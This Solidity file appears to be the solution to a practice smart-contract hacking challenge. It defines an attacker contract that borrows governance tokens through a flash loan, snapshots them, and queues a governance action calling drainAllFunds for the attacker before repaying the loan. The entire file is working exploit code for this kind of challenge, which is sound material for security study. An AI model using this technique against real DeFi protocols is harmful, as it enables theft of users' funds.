pragma solidity ^0.6.0;

import "./SelfiePool.sol";

interface ITokenSnapshot {
	function snapshot() external returns (uint256);
}

contract SelfieAttacker {

	function initiateFlashLoan(address poolAddress, uint256 amount) public {
		SelfiePool(poolAddress).flashLoan(amount);
	}

	function receiveTokens(address tokenAddress, uint256 amount) public {
		ITokenSnapshot(address(SelfiePool(msg.sender).token())).snapshot();
		bytes memory data = abi.encodeWithSignature(
			"drainAllFunds(address)",
			tx.origin
		);
		SelfiePool(msg.sender).governance().queueAction(msg.sender, data, 0);
		IERC20(tokenAddress).transfer(msg.sender, amount);
	}
}